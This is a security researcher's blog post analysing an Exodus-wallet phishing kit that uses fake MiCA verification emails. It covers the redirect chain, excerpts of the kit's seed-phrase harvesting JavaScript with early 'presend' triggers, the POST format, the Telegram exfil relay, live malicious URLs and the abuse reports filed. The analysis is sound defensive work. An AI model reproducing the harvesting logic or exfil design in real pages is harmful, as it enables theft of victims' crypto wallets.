---
title: "Inside an Exodus Wallet Phishing Kit: MiCA Lures, VM Bytecode, and a Telegram Exfil Relay"
description: "A technical teardown of a phishing campaign impersonating Exodus wallet using fake MiCA compliance notices, covering the redirect chain, BIP39 harvesting logic, a 34-wallet VM-obfuscated stealer, and a server probe that confirmed Telegram as the exfil channel."
pubDate: 2026-05-26
animation: "phishing-redirect"
---

A phishing email impersonating Exodus landed in my inbox on May 21, 2026. The subject line was "Your Exodus wallet is pending MiCA verification." The sender was `rply@bicesterwebdesign.uk`. Apple Mail flagged it as junk. I still decided to look into considering that I suspect that its the same threat actor that has been targeting me for a while.

This is a technical breakdown of the campaign: the email delivery infrastructure, the three-hop redirect chain, the phishing kit's credential harvesting logic, the 949KB VM-obfuscated multi-wallet stealer powering the second stage, and a server probe that found an exposed `telegram.php` relay file sitting alongside the collection endpoint.

## The Lure

The email impersonates Exodus's compliance team and invokes the EU MiCA (Markets in Crypto-Assets) regulation as a pretext, a real regulatory framework that most crypto users have heard of but few understand in detail. The text reads:

> "In line with the new MiCA (Markets in Crypto-Assets) Framework, which is now fully enforced globally, all regulated crypto-asset service providers are required to complete an enhanced customer due-diligence review for every active wallet... Wallets that remain unverified after this period may be temporarily restricted."

The deadline of "within 7 calendar days" is the urgency lever. The reference number `MICA-2026` is invented. Exodus does not verify wallets under MiCA or any other regulation by asking users to enter their seed phrase into a browser form.

The email was delivered via Amazon SES out of eu-west-1 (`54.240.3.25`). DKIM passes for both `bicesterwebdesign.uk` and `amazonses.com`. SPF passes. DMARC returns `permerror`: no DMARC record exists for the sending domain, so there is no enforcement and no rejection. The email clears every authentication gate. Apple Mail caught it on heuristics; most enterprise filters would too, but some won't.

One obfuscation detail worth noting: the preheader is flooded with zero-width non-joiners (`&zwnj;`), padding the invisible preview text so the phishing lure doesn't appear in email client notification previews.

## The Redirect Chain

The CTA button links to:

```
https://abzaseragam.com/yfh/?id=YWJ6YXNlcmFnYW0uY29t
```

The `id` parameter is base64 for `abzaseragam.com`, the first hop encoding itself as a campaign tracking token, passed through every redirect.

```
abzaseragam.com/yfh/?id=YWJ6YXNlcmFnYW0uY29t    302
  └─ PHP/8.4.21, LiteSpeed, 103.153.3.23
streetvibeupgrades.com/?id=YWJ6YXNlcmFnYW0uY29t  302
  └─ Cloudflare, 104.21.37.121
exodus.mica-update.com/verify-information/?id=…   200
  └─ Cloudflare, 104.21.75.137
```

`abzaseragam.com` is a compromised Indonesian school uniform retailer running WordPress 6.9.4 and WooCommerce. The `/yfh/` path is a malicious redirect injected into it; the rest of the site is a legitimate business. URL scanners checking the first hop see a real e-commerce store. `streetvibeupgrades.com` is a pure relay with no content; it exists to add another hop between the campaign link and the payload. Both hops pass the `id` parameter forward intact.

The phishing domain `exodus.mica-update.com` typosquats the MiCA regulation name. It resolves exclusively to Cloudflare IPs and uses Cloudflare nameservers, so the origin server is not reachable through standard DNS enumeration.

## The Kit

The landing page at `exodus.mica-update.com/verify-information/` uses exodus' brand design with a seven-step UX flow designed to funnel victims toward manual seed phrase entry:

1. Welcome / "Verify your information"
2. Fake progress bar: "Establishing secure session → Verifying wallet signature → Syncing with Exodus App"
3. "Wallet Synchronization" prompt
4. **Hardcoded sync failure**: "Couldn't reach the Exodus App. Please proceed manually."
5. 12-word BIP39 seed phrase input grid (*primary credential harvest*)
6. "Link an external wallet" modal (*second-stage multi-wallet stealer impersonating WalletConnect*)
7. "Verification complete"

Step 4 is the key social engineering beat. The sync failure is not a fallback; it is the intended path. Making the automated process appear to fail gives the victim a reason to enter credentials manually. The footer of the page reads "Secured by Exodus · v25.10.20," mimicking an authentic app version string.

## Seed Phrase Harvesting

The collection logic lives in `assets/app.js` (13KB, unobfuscated, last modified May 21, the same day as the email blast). Key constants:

```javascript
const WORDS = 12;
const WALLET_NAME = 'Exodus';
const WORDLIST_URL = 'assets/wordlist.json';
const SEND_URL = 'dist/api/send.php';
```

The kit validates each word client-side against the standard BIP39 English wordlist in real time, highlighting invalid entries as the victim types. This is not for the attacker's benefit; it makes the victim feel that a correct phrase is being accepted.

The more significant detail is the pre-send mechanism:

```javascript
const PRESEND_TRIGGERS = [
    { word: 11, minChars: 3 },
    { word: 12, minChars: 1 }
];
```

When the victim has filled words 1–10 and begins typing word 11, the full phrase is silently POSTed to `send.php` before they click anything. A second send fires when word 12 gets its first character. By the time the victim clicks "Continue," the phrase has already been transmitted twice. Someone who fills 11 words and closes the tab still loses their wallet.

The POST format:

```
POST /verify-information/dist/api/send.php
Content-Type: application/x-www-form-urlencoded

type=phrase&phrase=<12 words>&name=Exodus&presend=1
```

The server responds `{"result":"valid"}` regardless of input. There is no real validation on the backend; it accepts everything and keeps the victim engaged.

I submitted a fake BIP39 phrase generated offline using an air-gapped tool. It was transmitted four times across the session: twice via pre-send triggers, once on final submit, and once from the second-stage widget.

## The Multi-Wallet Stealer

After the seed phrase is accepted, the page transitions to a "Link an external wallet" step powered by `dist/widget.js`, a 949KB VM-obfuscated stealer targeting 34 wallet brands:

> Exodus, Ledger, Trezor (BIP39 + SLIP39/Shamir), MetaMask, Trust Wallet, Rabby, Coinbase Wallet, Phantom, OKX, Solflare, Uniswap, 1inch, Atomic, Backpack, Best Wallet, BitBox, BitGo, BitKey, Bitget, Blockchain.com, Coinomi, ElliPal, Electrum, imToken, KeepKey, Keplr, Keystone, MyEtherWallet, OneKey, Rainbow, SafePal, Tangem, TronLink, Zengo

Each wallet gets a custom UI flow. Trezor flows support both BIP39 and SLIP39 Shamir share input. Ledger, Trezor, and Rabby flows prompt for the BIP39 passphrase (25th word). All harvested credentials POST to the same `api/send.php` endpoint with a `name` field identifying the targeted wallet brand.

The `widget.js` last-modified date is May 2, three weeks before the email blast. This is a shared or rented kit component, pre-built and dropped into the campaign. The custom `app.js` for the Exodus-specific flow was written the morning the emails went out.

## Obfuscation

`widget.js` uses a custom JavaScript VM (`vmo_f6277b` / `vml_cb4cc1`). The entire kit is compiled to an internal bytecode format split across 444 base64-encoded chunks (~834KB of encoded program). Nothing in the file runs as parseable JavaScript; all logic executes inside the VM interpreter.

The VM wraps every browser global (`fetch`, `document`, `URL`, `Promise`, `Uint8Array`, etc.) in `Object.defineProperty` accessors, isolating itself from external patching or hooking. It uses `WeakMap`/`WeakSet` for private state and throws `TypeError` on any access to `caller`, `callee`, or `arguments`, defeating basic devtools call-stack tracing.

I decoded all 444 bytecode chunks and searched the decoded binary for Telegram bot token patterns (`\d{8,10}:[A-Za-z0-9_-]{35}`), webhook URLs, and any external hostname. Nothing. The token is not in the client-side JavaScript. On the email delivery side, the operator used DKIM on an attacker-owned domain with no DMARC record, a deliberate choice that lets authentication pass without creating an enforced policy that could trigger rejection. The Cloudflare bot challenge on the phishing domain blocks automated scanners from reaching the page without a valid `cf_clearance` cookie, and the three-hop redirect chain burns through the URL reputation of a compromised legitimate site before landing on the payload.

## Server-Side Infrastructure

Probing the live server surfaced the file layout of the API directory:

| Path | Status | Notes |
|------|--------|-------|
| `dist/api/send.php` | 200 | Main collection endpoint, live |
| `dist/api/telegram.php` | **200** | Exfil relay (Telegram confirmed) |
| `dist/api/send.php.bak` | 404 | No backup exposed |
| `dist/api/telegram.php.bak` | 404 | No backup exposed |
| `dist/api/.env` | 404 | No env file |
| `dist/api/config.php` | 404 | No config file |
| `dist/api/bot.php` | 404 | |
| `dist/api/discord.php` | 404 | |
| `dist/api/` (directory listing) | 403 | Blocked |

`telegram.php` returns HTTP 200 with an empty body on both GET and POST. That is the signature of a PHP include file; it defines constants and functions at the top level with no output statements, so PHP executes it cleanly and returns nothing. The architecture:

```
Browser → send.php → require('telegram.php')
                            ↓
                      BOT_TOKEN / CHAT_ID
                            ↓
                      api.telegram.org/sendMessage
```

The exfil channel is Telegram. The bot token is defined in `telegram.php` as a PHP constant, executed server-side, and never appears in any HTTP response. The `.git` directory also exists on the server; all git paths (`HEAD`, `COMMIT_EDITMSG`, `packed-refs`, `objects/`) return 403 from the nginx origin via a `location ~ /.git { deny all; }` rule. The kit was deployed via git and the repo is present but locked down.

## Indicators of Compromise

**Domains**

| Domain | Role |
|--------|------|
| `exodus.mica-update.com` | Phishing landing page |
| `mica-update.com` | Attacker-controlled parent zone |
| `streetvibeupgrades.com` | Redirect relay (hop 2) |
| `abzaseragam.com` | Compromised first hop (WordPress) |
| `bicesterwebdesign.uk` | Email sender domain (attacker-owned or compromised) |

**Infrastructure**

| Indicator | Value |
|-----------|-------|
| Sending IP | `54.240.3.25` (Amazon SES eu-west-1) |
| First-hop IP | `103.153.3.23` (direct hosting, LiteSpeed/nginx) |
| CF analytics token | `069bf21120da4f96888ee5f37c428a92` |
| CF Turnstile site key | `1eec422858ff` |
| DKIM selector | `kxldplqbdq6fk7ukv35pexiiwrm45lda` (`bicesterwebdesign.uk`) |
| Message-ID | `0102019e4ca9397e-b5dfebc5-8c5c-4f4c-a1f9-3db015974360-000000@eu-west-1.amazonses.com` |
| SES Feedback-ID | `::1.eu-west-1.NrBImPWz1QDCGhmtx4GxszksLhnckijRlopaUaNwi4E=:AmazonSES` |

**Malicious URLs**

```
https://abzaseragam.com/yfh/?id=YWJ6YXNlcmFnYW0uY29t
https://streetvibeupgrades.com/?id=YWJ6YXNlcmFnYW0uY29t
https://exodus.mica-update.com/verify-information/
https://exodus.mica-update.com/verify-information/dist/api/send.php
https://exodus.mica-update.com/verify-information/dist/api/telegram.php
https://exodus.mica-update.com/verify-information/assets/app.js
https://exodus.mica-update.com/verify-information/dist/widget.js
```

**Kit metadata**

```
app.js last-modified:    2026-05-21 13:24 UTC  (built day-of campaign)
widget.js last-modified: 2026-05-02 07:15 UTC  (shared kit, pre-built)
Kit version string:      v25.10.20
```

## Reporting

I have reported the indicators from this campaign to the following parties:

**Cloudflare** (`abuse@cloudflare.com`): I submitted the phishing domain `exodus.mica-update.com` alongside the CF analytics beacon token `069bf21120da4f96888ee5f37c428a92`, which is tied to the attacker's specific Cloudflare account and may link to additional infrastructure. The relay domain `streetvibeupgrades.com` was included in the same report.

**Amazon Web Services** (`abuse@amazonaws.com`): I reported the SES abuse with the full Message-ID (`0102019e4ca9397e-...`) and Feedback-ID. Amazon can identify and terminate the SES sending account associated with this campaign from those values alone.

**Telegram** (`abuse@telegram.org`): The exfil channel is a Telegram bot defined in `telegram.php` on the phishing server. I reported the phishing domain and the confirmed `telegram.php` endpoint so Telegram can identify and terminate the bot from their side, even without the token being exposed in HTTP traffic.

**Google Safe Browsing**: I submitted `exodus.mica-update.com` and `streetvibeupgrades.com` via the Safe Browsing report phishing form. This will propagate blocks to Chrome, Firefox, and Safari.

**PhishTank**: Both phishing-related domains have been submitted.

**UK NCSC** (`report@phishing.gov.uk`): `bicesterwebdesign.uk` is a `.uk` domain. I reported it to the NCSC's phishing reporting service for takedown or notification of the legitimate domain owner, who may be unaware their domain is being used as a sending identity.

**abzaseragam.com**: This is a compromised legitimate business, not a malicious operator. Rather than reporting the domain, I attempted to contact the site owner directly to notify them of the `/yfh/` redirect injection so they can remove it and audit their WordPress installation.

---

That was a clean campaign. The email auth setup (DKIM passing on an attacker-owned domain with no DMARC record) is increasingly common and still catches people off guard. The pre-send steal before form submission is the detail that matters most operationally: even a suspicious user who abandons the form halfway through loses their phrase. The VM bytecode in `widget.js` is sophisticated enough that static analysis alone will not get you to the exfil endpoint; you need to go after the server side, which is where `telegram.php` gave it away.
